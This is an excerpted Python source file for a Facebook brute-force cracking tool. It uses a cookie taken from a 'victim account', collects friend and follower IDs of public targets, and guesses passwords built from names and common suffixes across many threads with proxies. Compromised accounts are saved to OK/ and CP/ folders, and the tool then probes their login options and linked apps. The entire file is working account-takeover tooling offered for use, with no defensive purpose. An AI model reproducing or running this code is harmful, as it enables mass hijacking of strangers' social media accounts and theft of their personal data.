# Author by Rizwan Khan
# Don't hard to decode our script!!! 
# https://github.com/Badshawazir
# Don't forget to follow my github:)
     
     # Corporation FB Multi Brute Force
     # Tricker Not Hacker
     # Fb : Rizwan ullah.
     # Whastapp : +923345478919

# Grup Whastapp Admin : https://chat.whatsapp.com/DvXb23TbzQ1CfDvXwr2ifj
# Script Ini 100% Open Source Code:) 
# If anyone sells the script I say yak! 
# Hai Perikod:) 
...
#  #   #    # ###### #  # # 
#   #  #    # #    # #   ## 
#    # #    # #    # #    #  • FB Multi Brute Force •
\t\t{garis} author by {K}RizwanWazir v 0.0.2
""")
...
def cek_cookie():
	...
	try:
		...
		try:
			...
			x=f"{P2}Troubled Internet Connection"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login()
...
def login():
	banner()
	x=f"{P2}Please select the Cookie Login feature to proceed to the Arona Multi Brute Force menu.. if you don't understand what² be able to type {M2}help {P2}to ask for help !!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	...
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}+923345478919 {P2}Please chat if there are interests that want to be delivered to the AMBF Author\nini if it can't be directed to whastapp admin"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}Being directed to Whatsapp Author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+923345478919?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{warna_warni_biasa}•{P}] back")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}+923345478919 {P2}hope chat if there is an error\nini if it can't be directed to whastapp admin"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}Being directed to Whatsapp Author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+923345478919(?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{warna_warni_biasa}•{P}] back")
		login()
	elif cukuf in ["0","00"]:
		exit()
...
def login_cookie():
	print("")
	#testi_ua()
	x = f"\t\t{P2}Don't use a personal account!! must use a victim account to grab a cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} Enter cookies :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} is converting cookies to the token... please wait ")
...
def menu():
	...
	try:lok = x["locale"]
		...
		lok = "-"
	print("")
	x=f"\t\t\t{P2}[{H2}•{P2}] Your cellphone data\n{P2}Your IP : {H2}{IP}\n{P2}your country : {H2}{nibba}\n\t\t\t{P2}[{H2}•{P2}] Your Facebook account data\n{P2}{hhl} {K2}{name}\n{P2}Your date of birth : {H2}{pko}\n{P2}Your ID : {H2}{tumbal_id}\n{P2}present date : {H2}{now}\n{P2}accounts on : {H2}{tahunx}\n{P2}Related Phone Number : {H2}{no_kep}\n{P2}related email : {H2}{co}\n{P2}account location : {H2}{lok}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] crack with public\n{P2}[02] crack results\n{P2}[03] Detectored Option with CP Results\n{P2}[{M2}00{P2}] exit/delete cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXD = input(f"{garis} select : {H}")
	if HikmatXD in ["1","01"]:
		cracked_publickey()
		...
		print("")
		x=f"{P2}[01] Remove cookies\n{P2}[02] exit\n{P2}[{H2}00{P2}] back"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		zk = input(f"{garis} select : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} You are sure you want to remove cookies ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} successful removing default cookies ")
				cek_cookie()
			elif c in ["t","T","not"]:
				menu()
			else:
				print("")
				jalan(f"{garis} true content ")
				menu()
		elif zk in ["2","02"]:
			exit()
		#elif zk in ["3","03"]:
...
def hasil_crack():
	print("")
	x=f"{P2}[01] See the crack results {H2}ok\n{P2}[02] See the crack results {K2}cp\n{P2}[{H2}03{P2}] back"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} select : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" no results")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" no results")
			...
			for kaoo in c_o_k:
				...
				if cuih<10:
					...
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} account{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' account'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} account{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' account'+P)
			x=f"{P2}Select the results to display"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" select : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" no choice")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" files are not found") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" Your account list is ok\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" Your account list is ok") 
			input(garis+" back")
			menu()
		...
		if len(c_o_k)==0:
			...
			try:lin = open('CP/'+geh,'r').read()
				...
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list your CP account\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list your CP account") 
			input(garis+" back")
			menu()
...
def cracked_publickey():
	print("")
	x=f"{P2}ketik {H2}y{P2} to crack massal public\n{P2}ketik {H2}t{P2} for Public Crack"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cuy = input(f"{garis} Do you want mass cracks ({H}y{P}/{M}t{P}) ? : {H}")
	if cuy in ["y","Y"]:
	...
	if len(c_o_k)==0:
		...
		for kaoo in c_o_k:
			...
			if cuih<10:
				...
				lol.update({str(cuih):str(kaoo)})
				lol.update({__oo:str(kaoo)})
				x=f"{P2}{kaoo} • {str(len(hikmat))} account{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			else:
				lol.update({str(cuih):str(kaoo)})
				x=f"{P2} {kaoo} • {str(len(hikmat))} account{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	x=f"{P2}example : CP/{cpz}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	files = input(f"{garis} Choose that you want to check : {H}")
	try:
...
def HikmatXyz(user, pasw):
	...
	if "c_user" in ses.cookies:
		print("%s %saccount OK not checkpoint"%(garis,H))
		...
		if(str(len(ngew))=="0"):
			print("%s %stapyes account!!.. check immediately at fb lite/mbasic"%(garis,H))
		else:
			print("%s %sterdapat %s option "%(garis,K,str(len(ngew))))
		...
		print("%s %sThe account password has been replaced!!"%(garis,M))
		
def check_opsi_sesudah_crack():
	print("")
	x=f"{P2}Please airplane mode of 5 seconds before starting the check option:) or replace the sim card:) "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	input(f"{garis} Enter to continue ")
	files = (f"CP/{cpz}")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
...
def cracked_email():
	...
	if sae in["1"]:
		...
		for z in range(total):
			...
			sys.stdout.write(f"\r{garis} collecting id {len(id)} ");sys.stdout.flush()
	elif sae in["2"]:
		email = "@yahoo.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
...
def massal_cracked_public():
	print("")
	x=f"\t\t{P2}Target must be public & many his friends"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	try:
		jum = int(input(garis+" how much id :"+H+" "))
	except ValueError:
		jalan(garis+" what you type is not a number")
		menu()
	if jum<1 or jum>20:
		jalan(garis+" unexpected error")
		menu()
	ses=requests.Session()
	yz = 0
	x=f"\t\t{P2}type {H2}me{P2} to crack from friendship"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	for met in range(jum):
		yz+=1
		kl = input(garis+" input id to "+H+str(yz)+P+" :"+H+" ")
		#token = open('token.txt','r').read()
		...
		#for fuck in cyna['subscribers']['data']:
			...
			#except:pass
		#x=f"{P2}target name : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}location target account : {H2}{pok}"
		#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		uid.append(kl)
		#idez.append(kl)
	for userr in uid:
		try:
			...
			jalan(garis+" troubled internet connection ")
			exit()
	if len(id)==0:
...
def cracked_public():
	...
	try:
		...
		#print(f"{garis} Take ID A friend"+H+": "+nama["name"])
		...
		#except:
			...
			#print(M+" [x] Try searching for other accounts!")
			#exit()
		#global ttl__
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		...
		jalan(garis+" Failed Dump ID... maybe private friends/gada friends nya") 
		exit()
	
def settingers():
	print("")
	x=f"\t\t{P2}Special Crack Public\n{P2}[01] New order crack ({H2}public crack{P2})\n{P2}[02] crack id old ({H2}public crack{P2})\n{P2}[03] crack mix random ({H2}public crack{P2})\n\t\t{P2}special crack followers\n{P2}[04] crack id new ({H2}followers crack{P2})\n{P2}[05] crack id old ({H2}followers crack{P2})\n{P2}[06] crack mix random ({H2}followers crack{P2})"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
...
def crack_public_pilihan():
	...
	if met in ["1","01","a"]:
		...
		metode.append("mobile")
	print("")
	pw_tambahani = input(garis+" want to add additional passwords ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
		pw_tambahan.append("ya")
		x=f"{P2}Examples of additional passwords : {H2}khankhan,khan12345,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" additional password :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_ni.append(cpw)
	elif pw_tambahani in ["t","T","Not","not","no"]:
		pw_tambahan.append("no")
	else:
		pw_tambahan.append("no")
	nanya_proxy = input(garis+" want to add additional proxies ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_proxy in ["y","Y","yes","Ya"]:
		proxp()
	elif nanya_proxy in ["t","T","not","Not"]:
		proxp()
	else:
		proxp()
	uar = input(f"{garis} want to enter your additional ua ({H}y{P}/{M}t{P}) ? : {H}")
	if uar in ["y","Y","ya"]:
		ua = input(f"{garis} input ua : {H}")
		ugent = ua.split(',')
		...
		jalan(f"{garis} true content ")
		crack_public_pilihan()
	x=f"{P2}sorry the option feature of my gk hold.. because it doesn't recommend to crack:)"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	#tamtttl = input(garis+" want to bring up account TTL cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if tamtttl in ["y","Y","ya"]:
		#tampilkan_ttl.append("ya")
	#elif tamtttl in ["t","T","not"]:
		#tampilkan_ttl.append("no")
	#else:
		#tampilkan_ttl.append("no")
	#nanya_opsi = input(garis+" want to bring up the detect option ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if nanya_opsi in ["y","ya","Y"]:
		#tampilkan_opsi.append("ya")
	#elif nanya_opsi in ["t","T","not"]:
		#tampilkan_opsi.append("no")
	#else:
		#tampilkan_opsi.append("no")
	nanya_apk = input(garis+" want to bring up related applications ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_apk in ["y","ya","Y"]:
		tampilkan_apk.append("ya")
	elif nanya_apk in ["t","T","not"]:
		tampilkan_apk.append("no")
	else:
		tampilkan_apk.append("no")
	pw_tambahai = input(garis+" want to add a password behind the name ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
		pw_belakang.append("ya")
		x=f"{P2}example of a rear password : {H2}khankhan,khan1234,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password behind the name :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_lu.append(cpw)
	elif pw_tambahai in ["t","T","Not","not","no"]:
		pw_belakang.append("no")
	else:
		pw_belakang.append("no")
	pilpas = input(garis+" want to use a manual password ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pilpas in ["y","Y","ya","yes"]:
		with tread(max_workers=30) as HikmatXF:
			x=f"{P2}example password : {H2}khankhan,khan1234,sayang "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			listpass = input(garis+"%s list password :%s "%(P,H))
			if len(listpass)<=5:
				exit("\n"+garis+"%s password at least 6 numbers"%(M))
			x=f"{P2}list password crack {H2}{listpass}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}ok crack results are stored on {H2}OK/{now}.txt\n{P2}the results of crack cp are stored in {K2}CP/{now}.txt\n{P2}if there are no results try the airplane mode of 5 seconds then on\nmoga Get a lot of the results "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			for user in id:
		...
		if len(ok) != 0 or len(cp) != 0:
			x=f"{P2}results cp mu : {K2}{len(cp)}\n{P2}results ok mu : {H2}{len(ok)}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" back ")
			menu()
		else:
			x=f"{P2}how come it's a result? So handsome, if it's handsome, it's likely to get the result, the point must be handsome ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" back ")
			menu()
	elif pilpas in ["t","T","not","Not"]:
		passwer()

def passwer():
	print("")
	x=f"{P2}ok crack results are stored on {H2}OK/{now}.txt\n{P2}the results of crack cp are stored in {K2}CP/{now}.txt\n{P2}if there are no results try the airplane mode of 5 seconds then on again\nmoga Get a lot of the results "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	...
	print("")
	if ok != 0 or cp != 0:
		x=f"{P2}CP Results mu : {K2}{cp}\n{P2}OK results mu : {H2}{ok}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" back ")
		tanya_hal = input(f"{garis} Want to use check detector options for CP crack results ({H}y{P}/{M}t{P}) ? : {H}")
		if tanya_hal in ["y","Y","ya"]:
			check_opsi_sesudah_crack()
		elif tanya_hal in ["t","T","not"]:
			menu()
		else:
			menu()
	else:
...
def opsi_detect(uiz,pw):
	...
	try:
		...
		if len(opsi)==0:
			print(garis+H+" tap yes/a2f.. check the account again login on fb lite ")
		else:
			for opsii in opsi:
...
def cek_apk(ses,kuki):
	...
	if len(game)==0:
		print('\r'+garis+M+' NO related APK Related ')
	else:
		print('\r'+garis+H+' Related application : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Added to"," Added to"),P))
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' There is no associated expiration APK ')
	else:
		print('\r'+garis+K+' Related expiration application : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Expired"," Expired"),P))
		else:
			print('\r') 
